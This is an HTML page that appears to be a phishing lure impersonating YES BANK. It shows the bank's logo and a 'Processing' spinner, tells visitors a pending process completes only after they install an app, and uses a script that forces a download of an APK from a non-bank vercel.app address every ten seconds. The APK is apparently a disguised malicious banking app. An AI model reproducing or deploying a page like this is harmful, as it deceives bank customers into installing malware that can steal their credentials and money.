<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>iris - YES BANK - Processing</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 20px;
      text-align: center;
    }

    .container {
      max-width: 400px;
      margin: 100px auto 0;
    }

    .logo img {
      width: 150px;
      margin-bottom: 20px;
    }

    .spinner {
      border: 5px solid #eee;
      border-top: 5px solid #e91e63;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 30px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .verify-message {
      font-size: 15px;
      color: #d32f2f;
      margin-top: 20px;
      font-weight: 500;
    }

    .process-message {
      font-size: 15px;
      color: #333;
      margin-top: 10px;
      font-weight: 500;
    }

    .download-note {
      margin-top: 40px;
      color: #444;
      font-size: 14px;
    }

    .download-button {
      display: inline-block;
      padding: 14px 30px;
      margin-top: 15px;
      background-color: #e91e63;
      color: white;
      text-decoration: none;
      border-radius: 30px;
      font-size: 16px;
      transition: background 0.3s ease;
    }

    .download-button:hover {
      background-color: #c2185b;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://imgs.search.brave.com/a7JunU7klRpwmMvss_0rtLG3kgr_sJ8rXiUqnEbMq_0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9icmFu/ZGVwcy5jb20vbG9n/by1kb3dubG9hZC9Z/L1llcy1CYW5rLWxv/Z28tdmVjdG9yLTAx/LnN2Zw" alt="YES BANK Logo">
    </div>

    <div class="spinner"></div>

    <div class="verify-message">
      Note: If you download the app manually, you will be required to verify it before proceeding.
    </div>

    <div class="process-message">
      Your pending process will be completed after the app is downloaded and opened.
    </div>

    <p class="download-note">
      If your download hasnâ€™t started automatically,<br>
      you can manually download and install the app below:
    </p>

    <a class="download-button" href="https://yesbankupdate.vercel.app/Yesbank_Mobile4.apk" download id="autoDownload">Download Anyway</a>
  </div>

  <script>
    let userClicked = false;

    // Agar user manually click kare, toh auto-download band ho jaye
    document.getElementById('autoDownload').addEventListener('click', function() {
      userClicked = true;
    });

    // Har 10 second mein check karo, agar user ne download nahi kiya ho toh download start karo
    const autoDownloadInterval = setInterval(function() {
      if (!userClicked) {
        document.getElementById('autoDownload').click();
      } else {
        clearInterval(autoDownloadInterval); // Stop if user clicked
      }
    }, 10000); // every 10 seconds
  </script>
</body>
</html>
